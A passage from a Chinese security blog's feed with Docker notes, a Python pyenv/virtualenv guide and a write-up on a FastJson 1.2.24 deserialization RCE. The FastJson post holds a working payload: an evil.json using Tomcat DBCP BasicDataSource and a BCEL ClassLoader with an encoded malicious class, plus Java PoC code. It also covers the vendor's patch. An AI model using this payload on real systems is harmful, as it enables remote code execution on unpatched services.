class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dockerfile</span><br><span class="line">FROM centos:centos7</span><br><span class="line">CMD [&quot;/sbin/init&quot;]   //注意这里这个一定要有，否则docker-compose up -d 的时候会马上退出</span><br><span class="line"></span><br><span class="line">docker-compose.yml</span><br><span class="line">version: &apos;2&apos;</span><br><span class="line">services:</span><br><span class="line">  helloworld:</span><br><span class="line">    build: .</span><br><span class="line">    container_name: helloworld</span><br></pre></td></tr></table></figure></li><li><p>在一个docker-compose可以开启多个相同image的service,例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  c1:</span><br><span class="line">    image: centos:7</span><br><span class="line">    command: /usr/sbin/init</span><br><span class="line">  c2:</span><br><span class="line">    image: centos:7</span><br><span class="line">    command: /usr/sbin/init</span><br></pre></td></tr></table></figure></li><li><p>docker-compose.yml 中version的释义就是compose的高版本需要高版本的docker engine支持，docker engine版本可以通过docker version命令查看。具体的对版本表见下图<br><img src="/2018/09/26/笔记之docker的使用/docker-compose-version.png" alt=""></p></li><li>如果想要在docker中运行多个后台程序，比如apache的web服务和ssh的服务，可以使用supervisord。更多可以参考<a href="https://riptutorial.com/docker/example/14132/dockerfile-plus-supervisord-conf" target="_blank" rel="noopener">链接</a></li><li>在由phith0n维护的<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub</a>项目里有很多Dockerfile，覆盖了绝大部分常用应用，非常方便修改和使用。且设计比较合理，web代码基本都是通过挂载www目录的方式进行部署，调试和部署起来非常的方便，基本就是docker-compose bulid 和docker-compose up -d 两条命令的事儿。</li><li>把宿主机的一个目录挂载到容器中，当访问容器中的这个目录时，出现如下问题： ls: cannot open directory .: Permission denied 这个问题可以参考文章<a href="https://blog.csdn.net/CHENYUFENG1991/article/details/79842459" target="_blank" rel="noopener">docker挂载目录失败/权限拒绝 解决方案</a></li><li>有时候docker-compose up -d 的时候 容器马上exit，这个时候一般是启动出现了问题，可以通过 docker-compose up  或者docker-compose  —verbose up通过查看详细的输出信息定位具体是哪里出问题了。</li><li>在向docker中放shell脚本的时候 需要在外部添加可执行权限。</li><li>在开启容器的时候如果需要执行多个命令，而且多个命令如果是”阻塞”的，可以在docker-compose.yml 文件中写入ENTRYPOINT 例如[“/usr/local/bin/docker-entrypoint.sh”]，这样在容器启动的时候会自动的运行docker-entrypoint.sh shell脚本里面可以写你想要其运行的多条命令。</li><li>有些镜像或者外部的资源下载比较的慢，这个时候使用proxychains给终端挂上代理，或者把资源下载到本地，在Dockerfile里面使用COPY命令进行本地拷贝。</li><li>在centos7可能会遇到Docker error IPv4 forwarding is disabled的问题，<a href="http://mbacchi.github.io/2017/09/29/docker-ipv4-forwarding-disabled.html" target="_blank" rel="noopener">参考链接</a></li><li>开始的时候不建议使用最精简的linux系统，不然你会发现怎么连个vi命令都没有，什么都还得需要 RUN 安装，比较麻烦。centos7 最小化安装之后，默认是没有 ifconfig,netstat等命令，可以直接使用 yum -y install net-tools 安装即可。</li><li>有时候mysql就是起不来，这个时候 使用docker volume list查看 然后删除数据就可以了，其它情况也是 全部删除，<a href="https://github.com/laradock/laradock/issues/421" target="_blank" rel="noopener">参考链接</a>，docker volume  rm 就可以删除对应的数据库了。</li><li>pull回来的镜像如果想修改其中的用户密码，可以在Dockerfile中写如下的命令 RUN echo “root:Docker!” | chpasswd或者RUN echo “Docker!” | passwd –stdin root 即修改root的密码为Docker！。<a href="https://stackoverflow.com/questions/28721699/root-password-inside-a-docker-container" target="_blank" rel="noopener">stackoverflow</a></li><li>在此记录一下，不知道是不是docker的一个bug，当我在虚拟机里面创建一个文件，并且通过chattr +i 赋予文件不可修改属性的时候，当你关闭容器，一般容器并不会主动保存，除非你主动打包成镜像，所以它会去删除这个文件以保持“镜像不变性质”(暂且先这么叫吧)，这个时候会去删除这个文件，因为设置了不可修改属性，这个时候就会报错，如下图所示.<br><img src="/2018/09/26/笔记之docker的使用/bug.png" alt=""></li><li>docker-compose时候报错 ERROR: invalid reference format,有可能是路径中包含中文所导致的<h4 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h4></li><li>最后还是多写或多修改几个Dockerfile和docker-compose.yml实际去体验一下，你会发现用他们来搭建漏洞环境very棒 ；P</li><li>当然docker的应用不仅仅是搭建漏洞环境，技术也不仅仅有Dockerfile、docker-compose，还有更多与docker相关优秀的开源项目像是Kubernetes、CoreOS、Etcd项目等。<br><img src="/2018/09/26/笔记之docker的使用/guli.jpg" alt=""></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>python虚拟环境安装和使用</title>
      <link href="/2018/07/15/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/07/15/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>Mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三方包安装需要root权限可能导致的安全问题等，所有就有了python虚拟环境，这里主要记录一下笔者在安装和使用pyenv以及virtualenv过程。<h4 id="pyenv安装和使用"><a href="#pyenv安装和使用" class="headerlink" title="pyenv安装和使用"></a>pyenv安装和使用</h4></li><li><p>推荐使用brew安装pyenv </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Install Homebrew</span><br><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; </span><br><span class="line"># Install pyenv</span><br><span class="line">brew install pyenv </span><br><span class="line"># Add pyenv initializer to shell startup script</span><br><span class="line"># ZSH USERS: use ~/.zshrc instead of ~/.bash_profile</span><br><span class="line"># LINUX USERS: use ~/.bashrc instead of ~/.bash_profile</span><br><span class="line">echo &apos;eval &quot;$(pyenv init -)&quot;&apos; &gt;&gt; ~/.bash_profile </span><br><span class="line"># Restart your shell for changes to take effect</span><br><span class="line">exec $SHELL</span><br></pre></td></tr></table></figure></li><li><p>使用pyenv install –list 查看可用的python版本</p></li><li>使用pyenv install  3.6.* 安装特定版本的python（建议安装个python2 和python3的环境即可）</li><li>查看已安装的版本 pyenv versions<br><img src="/2018/07/15/python虚拟环境安装和使用/pyenvversions.png" alt=""></li><li>python环境切换 使用pyenv global xxx 或者pyenv local ,其中前者是全局的设置，而后者是针对当前项目python环境的设置,还可以使用pyenv shell xxx 设置当前shell的python版本，退出shell后失效。</li><li>在进行版本切换的时候，可能会出现AttributeError: module ‘enum’ has no attribute ‘IntFlag’或者raise ImportError(‘This package should not be accessible on Python 3. ‘<br>ImportError: This package should not be accessible on Python 3. Either you are trying to run from the python-future src folder or your installation of python-future is corrupted.这个错误，这个时候使用unset PYTHONPATH可以解决问题。<h4 id="配置pycharm"><a href="#配置pycharm" class="headerlink" title="配置pycharm"></a>配置pycharm</h4></li><li>现实中我们往往可能需要使用pycharm这种IDE进行python的开发，那么如何在pycharm中进行python版本的自由切换呢？</li><li>其实pycharm 和idea都属于 jetbrains家族产品，使用上面很是类似。</li><li>打开一个项目，选择file-&gt; Default Settings-&gt; Python Interpreter-&gt; show ALL -&gt; +号 -&gt; Existing environment -&gt; 进行下拉框的选择就OK<br><img src="/2018/07/15/python虚拟环境安装和使用/setpycharm.png" alt=""></li><li>之后就可以通过添加完的Python Interpreter选择对应版本的Interpreter进行解释执行了。<h4 id="virtualenv的安装和使用"><a href="#virtualenv的安装和使用" class="headerlink" title="virtualenv的安装和使用"></a>virtualenv的安装和使用</h4></li><li>pyenv用于不同python版本之间的切换，还有一种场景就是在确定了python版本之后，需要第三方包不同版本之间的切换，比如不同版本的django版本之间的版本切换，于是就有了virutalenv。</li><li><p>安装（还是brew）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Install Homebrew</span><br><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br><span class="line"># Install pyenv-virtualenv</span><br><span class="line">brew install pyenv-virtualenv</span><br><span class="line"># Add pyenv-virtualenv initializer to shell startup script</span><br><span class="line"># ZSH USERS: use ~/.zshrc instead of ~/.bash_profile</span><br><span class="line"># LINUX USERS: use ~/.bashrc instead of ~/.bash_profile</span><br><span class="line">echo &apos;eval &quot;$(pyenv virtualenv-init -)&quot;&apos; &gt;&gt; ~/.bash_profile</span><br><span class="line"># Restart your shell for changes to take effect</span><br><span class="line">exec $SHELL</span><br></pre></td></tr></table></figure></li><li><p>创建一个虚拟环境 例如 pyenv virtualenv 3.6.1 django-1.10</p></li><li>激活这个虚拟环境 例如 pyenv activate django-1.10</li><li>安装对应版本的第三方包 pip install django==1.10<br><img src="/2018/07/15/python虚拟环境安装和使用/virtualenv.png" alt=""></li><li>如上图所示，就相当于进一步定制化了环境（python2.7.14 and django==1.10）。</li><li>此外和上面配置pycharm一样对pycharm进行相应开发环境的配置。</li><li>退出当前的虚拟环境 pyenv deactivate xxx<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><em><a href="https://medium.com/@jordanthomasg/python-development-on-macos-with-pyenv-virtualenv-ec583b92934c" target="_blank" rel="noopener">Python Development on macOS with pyenv-virtualenv</a></em><a href="https://www.cnblogs.com/kevingrace/p/10130801.html" target="_blank" rel="noopener">Python多版本管理器-pyenv 介绍及部署记录</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>FastJson反序列化漏洞(续)</title>
      <link href="/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/"/>
      <url>/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/</url>
      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="noopener">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :(</li><li>作者文章写的很好，只是有些点以及代码没有完全给出来，所以需要自己去测试。<h4 id="details"><a href="#details" class="headerlink" title="details"></a>details</h4></li><li>在上面的文章中作者是利用了tomcat-dbcp.jar组件中org.apache.tomcat.dbcp.dbcp.BasicDataSource类的Class.forName()方法，关于Class.forName执行代码的方法，有两种（作者也在文章中介绍了），这个Class.forName是关键，它可以设置classLoader和classname，从而加载.class文件，恶意的.class中静态代码块儿static{}会执行。下面给出文章中一些缺少的代码。关于ClassLoader的机制可以参考@frozenme大佬的文章(很棒)：P<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package FastJsonDemo;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        //There also should be compiled class file,not java file</span><br><span class="line">        Path path = Paths.get(&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class&quot;);</span><br><span class="line">        byte[] data = Files.readAllBytes(path);</span><br><span class="line">        String s =  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里用于将evil.class文件进行BCEL编码。</p><ul><li><p>在作者的poc的基础上精简了一下，直接读取并反序列化外部json文件触发漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package FastJsonDemo;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line">import jdk.internal.dynalink.support.TypeUtilities;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class FastJsonPwn  &#123;</span><br><span class="line"></span><br><span class="line">    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException &#123;</span><br><span class="line">        InputStream is = new FileInputStream(filePath);</span><br><span class="line">        String line; // 用来保存每行读取的内容</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        line = reader.readLine(); // 读取第一行</span><br><span class="line">        while (line != null) &#123; // 如果 line 为空说明读完了</span><br><span class="line">            buffer.append(line); // 将读到的内容添加到 buffer 中</span><br><span class="line">            buffer.append(&quot;\n&quot;); // 添加换行符</span><br><span class="line">            line = reader.readLine(); // 读取下一行</span><br><span class="line">        &#125;</span><br><span class="line">        reader.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String s = &quot;java.lang.Thread&quot;;</span><br><span class="line">        //long hash = TypeUtilities.fnv1a_64(s);</span><br><span class="line"></span><br><span class="line">        //Class.forName(&quot;FastJsonDemo.Run&quot;);</span><br><span class="line"></span><br><span class="line">//        String classname = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;;</span><br><span class="line">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">//        Class.forName(classname, true, cls);</span><br><span class="line">        //note  project must contain dbcp external lib</span><br><span class="line">//        String poc = &quot; &#123;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\t\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="line">//                &quot;\t\t\t&#125;,\n&quot; +</span><br><span class="line">//                &quot;\t\t\t\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\&quot;\n&quot; +</span><br><span class="line">//                &quot;\t\t&#125;\n&quot;;</span><br><span class="line">        StringBuffer Buffer = new StringBuffer();</span><br><span class="line">        FastJsonPwn.readToBuffer(Buffer,&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.json&quot;);</span><br><span class="line">        Object obj= JSON.parseObject(Buffer.toString());</span><br></pre></td></tr></table></figure></li><li><p>evil.json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">  &quot;driverClassLoader&quot; :</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/06/18/FastJson反序列化漏洞(续)/pwn.png" alt=""><br>其它可能用到的代码已经放到<a href="https://github.com/kevien/javacode" target="_blank" rel="noopener">github</a></p><h4 id="about-patch"><a href="#about-patch" class="headerlink" title="about patch"></a>about patch</h4><ul><li>笔者进行漏洞测试的版本是1.2.24，在17年12月11号，fastjson维护者更新了一段代码<a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="noopener">github</a><br><img src="/2018/06/18/FastJson反序列化漏洞(续)/denylist.png" alt=""></li><li>作者将原来的denyList改为denyHashCodes的方式进行黑名单拦截（最新版本依然采用这种方式），其中denyHashCode的计算方式略微复杂，增加了攻击门槛。<br><img src="/2018/06/18/FastJson反序列化漏洞(续)/calculatehash.png" alt=""><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li><li>较Template攻击方式此攻击方式不需要设置Feature.SupportNonPublicField，但是需要外部的jar包（因为这个jar包和JDBC数据库连接相关，可能很多项目应该都使用了，所以影响也还是很大）。</li><li>利用 defineClass 在运行时状态下，将我们精心构造的 class 文件加载进入 ClassLoader，通过<br>java 的 static{}特征，导致代码执行。</li><li>此payload较之前的有个好处就是不需要受害者开启Feature.SupportNonPublicField这个‘特性‘。</li><li>根据作者之前通过的denylist其实就可以知道这个漏洞的利用方式很多种，和python类似，java很多漏洞都还是绕denyList的问题。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li><li><a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">DefineClass在Java反序列化当中的利用</a></li><li><a href="https://threathunter.org/topic/5a49570eec721b1f1966f30f" target="_blank" rel="noopener">Evading Anti-Virus by using dynamic code generation and reflection</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> java安全 RCE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
